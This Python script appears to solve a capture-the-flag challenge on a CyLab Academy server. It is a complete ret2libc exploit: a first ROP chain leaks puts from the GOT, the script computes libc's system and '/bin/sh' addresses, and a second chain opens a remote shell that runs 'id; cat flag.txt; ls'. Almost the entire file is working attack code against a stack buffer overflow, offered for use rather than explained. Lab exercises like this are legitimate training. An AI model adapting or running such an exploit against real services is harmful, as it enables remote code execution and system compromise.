import sys, socket, time, re, struct, subprocess
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "xebec.cylabacademy.net", 15996
PUTS_GOT = 0x601018
PUTS_PLT = 0x400540
DO_STUFF = 0x4006D8
POP_RDI = 0x400913
RET = 0x40052E
OFF = 0x80 + 8
LIBC_PUTS = 0x80A30
LIBC_SYSTEM = 0x4F4E0

r = subprocess.run(["wsl", "-d", "kali-linux", "--", "bash", "-lc",
                    "cd /mnt/c/Users/arnol/AppData/Local/Temp/cylab_bin && python3 -c \"d=open('179_libc.so.6','rb').read(); print(d.find(b'/bin/sh'))\""],
                   capture_output=True, text=True)
off_binsh = int((r.stdout or "0").strip() or 0)
print("binsh off:", hex(off_binsh))

s = socket.create_connection((HOST, PORT), timeout=15)
s.settimeout(8)
time.sleep(0.8)
try:
    s.recv(8192)
except Exception:
    pass
p1 = b"A" * OFF + struct.pack("<Q", POP_RDI) + struct.pack("<Q", PUTS_GOT) + struct.pack("<Q", PUTS_PLT) + struct.pack("<Q", DO_STUFF)
s.sendall(p1 + b"\n")
time.sleep(1.2)
data = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
        if len(data) > 6000:
            break
except Exception:
    pass
print("recu:", len(data))
print("tail:", data[-40:])
# le leak : les 6 octets avant le dernier \n
if data.endswith(b"\n"):
    leak_bytes = data[-7:-1]
else:
    leak_bytes = data[-6:]
print("leak bytes:", leak_bytes.hex())
leak = int.from_bytes(leak_bytes + b"\x00\x00", "little")
print("leak:", hex(leak))
if leak < 0x700000000000:
    print("leak invalide")
    sys.exit(1)
libc_base = leak - LIBC_PUTS
system = libc_base + LIBC_SYSTEM
binsh = libc_base + off_binsh
print("libc:", hex(libc_base), "system:", hex(system), "binsh:", hex(binsh))
p2 = b"A" * OFF + struct.pack("<Q", RET) + struct.pack("<Q", POP_RDI) + struct.pack("<Q", binsh) + struct.pack("<Q", system)
s.sendall(p2 + b"\n")
time.sleep(1.2)
s.sendall(b"echo SHELL_OK; id; cat flag.txt; ls\n")
time.sleep(1.5)
out = b""
try:
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        out += chunk
except Exception:
    pass
txt = out.decode("utf-8", "replace")
print("=== SHELL ===")
print(txt[:1200])
m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
if m:
    print("FLAG:", m.group(0))
s.close()
